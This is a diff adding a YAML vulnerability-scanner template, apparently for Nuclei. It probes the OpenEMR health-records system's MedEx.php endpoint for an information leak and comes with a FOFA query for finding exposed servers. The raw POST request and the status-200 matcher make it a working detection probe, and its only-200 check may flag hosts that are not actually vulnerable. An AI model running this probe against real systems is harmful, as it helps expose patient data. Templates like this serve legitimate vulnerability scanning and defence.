@@ -1,0 +1,28 @@
+id: poc-eltxdp2hzt7mzs3e
+info:
+  name: OpenEMR电子健康档案系统MedEx.php存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eltxdp2hzt7mzs3e'
+  tags: info-leak,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: eltxdp2hzt7mzs3e
+    fofa: title="OpenEMR"
+http:
+- raw:
+  - 'POST /library/MedEx/MedEx.php HTTP/1.1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+
+    callback_key=test'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
